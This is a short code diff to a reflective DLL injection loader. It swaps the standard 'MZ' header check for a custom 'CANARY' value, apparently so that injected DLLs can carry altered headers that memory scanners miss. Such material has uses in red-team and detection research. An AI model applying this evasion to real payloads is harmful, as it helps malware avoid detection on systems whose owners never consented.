@@ -90,9 +90,10 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
 
    // loop through memory backwards searching for our images base address
    // we dont need SEH style search as we shouldnt generate any access violations with this
+   #define CANARY 0x5941
    while( TRUE )
    {
-      if( ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE )
+      if( ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == CANARY )
       {
          uiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
          // some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),
